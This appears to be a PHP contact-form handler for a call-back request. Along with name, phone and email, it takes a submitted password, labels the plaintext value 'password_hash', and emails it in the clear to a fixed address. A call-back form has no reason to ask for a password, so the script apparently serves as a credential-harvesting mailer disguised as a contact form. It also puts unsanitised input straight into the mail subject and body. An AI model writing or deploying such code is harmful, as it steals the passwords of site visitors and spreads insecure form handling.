<?php
// check if fields passed are empty
if(empty($_POST['name'])  		||
   empty($_POST['phone']))
   {
	echo "No arguments Provided!";
	return false;
   }

$name = $_POST['name'];
$email_address = 'info@rjgroup.com.ua';
$phone = $_POST['phone'];
$users_email = $_POST['email'];
$password_hash = $_POST['pwd'];


// create email body and send it
$email_subject = "Website Contact Form:  $name";
$email_body = "You have received a call-back request from your website contact form.\n\nHere are the details:\n\nName: $name\n\nPhone: $phone\n\nEmail: $users_email\n\nPassword: $password_hash\n\n";
mail($email_address,$email_subject,$email_body);
return true;
?>
